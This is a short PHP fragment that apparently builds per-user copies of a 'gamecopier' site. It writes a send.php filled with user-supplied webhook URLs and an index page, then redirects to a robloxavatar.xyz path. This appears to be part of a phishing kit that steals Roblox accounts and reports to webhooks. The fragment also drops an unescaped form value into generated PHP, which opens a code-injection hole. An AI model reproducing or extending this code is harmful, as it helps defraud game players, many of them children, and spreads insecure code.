...
if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    ...
    if(!is_dir($dir)){
        ...
        fwrite(fopen($dir.'/send.php', "w"), str_replace("{whook}", htmlspecialchars($_POST['webhook2'],ENT_QUOTES),str_replace("{whook1}", $thook, str_replace("{folder}", $dir2, str_replace("{folder1}", $_POST['folder'], file_get_contents("send.php"))))));
        fwrite(fopen($dir.'/index.php', "w"), str_replace("{folder1}", htmlspecialchars($_POST['folder'],ENT_QUOTES), str_replace("{folder}", $dir2, file_get_contents("index1.php"))));
        header("location: https://robloxavatar.xyz/gamecopier/$dir2/$dir");
    }
?> 
<style>
    html {
